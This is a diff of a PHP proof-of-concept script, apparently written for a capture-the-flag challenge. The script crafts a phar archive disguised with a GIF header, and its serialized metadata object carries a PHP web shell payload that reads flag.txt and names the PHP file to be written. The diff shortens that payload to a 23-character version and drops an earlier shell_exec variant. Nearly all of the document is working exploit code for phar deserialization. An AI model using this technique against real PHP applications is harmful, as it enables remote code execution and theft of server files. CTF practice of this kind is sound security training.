@@ -2,23 +2,19 @@
 
 // PoC for Challenge
 // William Moody
-// 10.04.2021
-
-class Message
-{
-    public function __construct()
-    {
-        $this->to = "<?php echo shell_exec('cat ../flag.txt'); ?>";
-        $this->filePath = "/var/www/html/images/shell.php";
-    }
-}
+// 14.04.2021
 
 $phar = new Phar("poc.phar");
-$phar->startBuffering();
-$phar->setStub("GIF89a;<?php __HALT_COMPILER(); ?>");
 
+$phar->startBuffering();
+
+$phar->addFromString('0','');
+$phar->setStub("GIF8__HALT_COMPILER();");
+
+class Message {}
 $payload = new Message;
+$payload->to = "<?=`cat flag.txt`?>"; // 23 characters
+$payload->filePath = "z.php";
 $phar->setMetadata($payload);
 
-$phar->addFromString("poc.txt","What would you do if you weren't afraid?");
 $phar->stopBuffering();
